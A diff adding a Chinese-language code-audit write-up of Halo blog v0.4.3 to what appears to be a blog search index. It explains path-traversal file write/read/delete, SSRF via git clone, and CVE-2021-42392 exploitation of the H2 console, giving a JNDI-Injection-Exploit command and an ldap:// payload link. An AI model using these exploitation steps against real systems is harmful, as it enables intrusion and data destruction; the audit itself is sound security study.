@@ -1,6 +1,68 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Halo博客代码审计</title>
+    <url>/2024/06/11/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<h1 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h1><p><a class="link" href="https://github.com/halo-dev/halo/releases/tag/v0.4.3">Release 0.4.3 · halo-dev&#x2F;halo (github.com)<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h1><h2 id="任意文件写入漏洞"><a href="#任意文件写入漏洞" class="headerlink" title="任意文件写入漏洞"></a>任意文件写入漏洞</h2><p>在ThemeController.java文件中,获取根路径并且获取输入的tplName值与路径拼接,然后将tplContent内容写入当中</p>
+<p>并且在代码当中并没有对..&#x2F;进行过滤等操作,所以可以产生任意文件写入</p>
+<p>跟踪路由到功能点</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211175458217.png" alt="image-20241211175458217"></p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211175608675.png" alt="image-20241211175608675"></p>
+<p>抓包构造poc,验证漏洞</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211180037437.png" alt="image-20241211180037437"></p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211180024286.png" alt="image-20241211180024286"></p>
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>同样在ThemeController.java文件下,发现获取模板内容,那有没有可能获取其他文件内容呢</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211180407222.png" alt="image-20241211180407222"></p>
+<p>抓包,看他的请求包,它的路径为admin&#x2F;themes&#x2F;getTpl并且需要一个get请求tplName,我们可以尝试访问我们之前写入的1.txt</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211180747041.png" alt="image-20241211180747041"></p>
+<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>在备份数据库的地方有个删除功能,跟入代码</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211181333410.png" alt="image-20241211181333410"></p>
+<p>它将路径文件名拼接起来而已,就进行了删除,我们抓包构造poc,如果我们不知道前面的路径可以调试来找路径</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211181536401.png" alt="image-20241211181536401"></p>
+<p>获取到了路径,我们可以测试构造poc删除halo文件夹下的1.txt</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211181903645.png" alt="image-20241211181903645"></p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211181940683.png" alt="image-20241211181940683"></p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211181950768.png" alt="image-20241211181950768"></p>
+<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p>在正向梳理文章功能时,看到有个远程下载主题,猜想可能有ssrf</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211223632536.png" alt="image-20241211223632536"></p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211223719225.png" alt="image-20241211223719225"></p>
+<p>命令执行调用git clone然后拼接网址造成ssrf</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211223836749.png" alt="image-20241211223836749"></p>
+<h2 id="RCE-未出"><a href="#RCE-未出" class="headerlink" title="RCE(未出)"></a>RCE(未出)</h2><p>我们看到上面ssrf漏洞的代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">cmdResult</span> <span class="operator">=</span> RuntimeUtil.execForStr(<span class="string">&quot;git clone &quot;</span> + remoteAddr + <span class="string">&quot; &quot;</span> + themePath.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + themeName);</span><br></pre></td></tr></table></figure>
+
+<p>猜想会不会是它自己写了一个方法调用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure>
+
+<p>我们跟入execForStr方法</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211224101179.png" alt="image-20241211224101179"></p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211225620837.png" alt="image-20241211225620837"></p>
+<p>我们跟入exec方法,看到了命令执行语句,尝试构造poc,但是没有反应不知道为什么</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211225657096.png" alt="image-20241211225657096"></p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211225745277.png" alt="image-20241211225745277"></p>
+<h1 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h1><h2 id="H2-Database-代码注入"><a href="#H2-Database-代码注入" class="headerlink" title="H2 Database 代码注入"></a>H2 Database 代码注入</h2><p>进而在 pom.xml 进行依赖组件漏洞版本审查时，发现该系统使用了 H2 Database，但在 pom.xml 没有 显示 H2 Database 版本号，使用 Ctrl + 鼠标左键点击 com.h2database 进入查看版本号发现使用了 1.4.197 版本，这个版本存在 CVE-2021-42392 漏洞，即 H2 Database 控制台存在远程代码执行漏洞， 或者也可以说成存在 JNDI 注入漏洞</p>
+<p>想要利用该漏洞有几个前提，在配置文件处可以看到： </p>
+<ul>
+<li>web-allow-others: true，这个设置允许其他网络上的计算机访问H2数据库的控制台。通常情况 下，H2数据库的控制台只允许本地访问，但设置为 true 后，其他计算机也可以通过网络访问该控 制台。 </li>
+<li>enabled: true，这个设置启用了H2数据库的控制台。将其设置为 true 后，你就可以通过下述配 置的路径访问H2数据库的控制台。 </li>
+<li>path: &#x2F;h2-console，这是H2数据库控制台的路径配置。它指定了通过Web浏览器访问控制台的 URL路径。在这个例子中，控制台可以通过 <a class="link" href="http://yourdomain/h2-console">http://yourdomain/h2-console<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<p>访问<a class="link" href="http://127.0.0.1:8090/h2-console,%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0h2%E6%8E%A7%E5%88%B6%E5%8F%B0">http://127.0.0.1:8090/h2-console,可以看到h2控制台<i class="fas fa-external-link-alt"></i></a></p>
+<p>打开 CMD，进入该工具路径下，键入命令 java -jar JNDI-Injection-Exploit1.0-SNAPSHOT-all.jar -C “calc.exe” ，可以看出给出了 JNDI 链接</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211231030312.png" alt="image-20241211231030312"></p>
+<p>复制上述链接 ldap:&#x2F;&#x2F;192.168.137.1:1389&#x2F;ng2ntb ，然后进入 H2 控制台，在 JDBC URL  处输入这个链接，Drive Class 键入 javax.naming.InitialContext ，最后点击 content，即可看到弹出了计算器</p>
+<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211231417413.png" alt="image-20241211231417413"></p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>RBAC代码审计</title>
     <url>/2024/05/26/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
     <content><![CDATA[<h1 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h1><p>首先查看pom.xml文件,查看运用了哪些组件,并且查询是否有漏洞</p>
